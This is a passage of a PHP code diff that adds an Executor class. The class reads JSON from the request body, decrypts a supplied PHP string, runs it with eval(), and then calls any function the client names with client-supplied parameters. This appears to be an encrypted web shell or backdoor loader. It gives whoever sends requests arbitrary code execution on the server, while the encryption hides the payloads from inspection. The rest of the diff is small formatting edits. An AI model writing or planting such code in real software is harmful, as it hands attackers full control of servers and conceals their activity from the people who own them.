@@ -193,7 +193,7 @@ trait ClientDataValidator
             try {
                 $this->validateSingle($obj, $classObjTyping, $clientArgs);
             } catch (Exception $e) {
-                $$exceptionsArray[] = $e;
+                ${$exceptionsArray}[] = $e;
             }
         }
         if ($exceptionsArray !== []) {
@@ -406,10 +406,10 @@ class TestPhpOpenssl implements DecryptorTester
     {
         $exceptionArray = [];
         $functions = [
-            function (): ?array {
+            function () : ?array {
                 return $this->testOpensslFunctions();
             },
-            function (): ?string {
+            function () : ?string {
                 return $this->testOpensslCipher();
             }
         ];
@@ -464,6 +464,7 @@ class GetPHP
 class Executor
 {
     use Singleton;
+    use ClientDataValidator;
     /**
      * @readonly
      * @var \Decryptor
@@ -472,11 +473,27 @@ class Executor
     /**
      * @var mixed[]
      */
-    private $clientData = [];
+    private $decryptorData;
+    /**
+     * @var string|null
+     */
+    private $command;
+    /**
+     * @var mixed[]|null
+     */
+    private $parameters;
+    private function getClassObjs(): array
+    {
+        return [
+            "decryptor" => new ClassObjTyping(Typing::OBJECT, ClassObjOptional::MANDATORY),
+            "command" => new ClassObjTyping(Typing::STRING, ClassObjOptional::OPTIONAL),
+            "parameters" => new ClassObjTyping(Typing::OBJECT, ClassObjOptional::OPTIONAL),
+        ];
+    }
     private function __construct()
     {
         $rawClientData = file_get_contents('php://input');
-        $this->clientData = json_decode(
+        $clientData = json_decode(
             $rawClientData,
             true,
             512,
@@ -485,14 +502,30 @@ class Executor
         if (json_last_error() !== JSON_ERROR_NONE) {
             throw new \Exception(json_last_error_msg());
         }
-        // $this->clientData = [
-        //     "cipher_algo" => "aes-256-gcm",
-        //     "passphrase" => "lol",
-        // ];
+        $this->validate($clientData);
+        $this->decryptorData = $clientData["decryptor"];
+        if (isset($clientData["command"])) {
+            $this->command = $clientData["command"];
+        }
+        if (isset($clientData["parameters"])) {
+            $this->parameters = $clientData["parameters"];
+        }
         $decryptorPtr = GetPHP::getInstance()->getDecryptor();
-        $this->decryptor = $decryptorPtr::getInstance($this->clientData);
+        $this->decryptor = $decryptorPtr::getInstance($this->decryptorData);
     }
+    /**
+     * @return mixed
+     */
     private function exec(string $encryptedPhpString)
     {
+        $phpString = $this->decryptor->decrypt($encryptedPhpString);
+        $evalReturn = eval($phpString);
+        if (!$this->command) {
+            return $evalReturn;
+        }
+        if (!function_exists($this->command)) {
+            throw new Exception("function {$this->command} does not exist");
+        }
+        return call_user_func($this->command, $this->parameters);
     }
 }
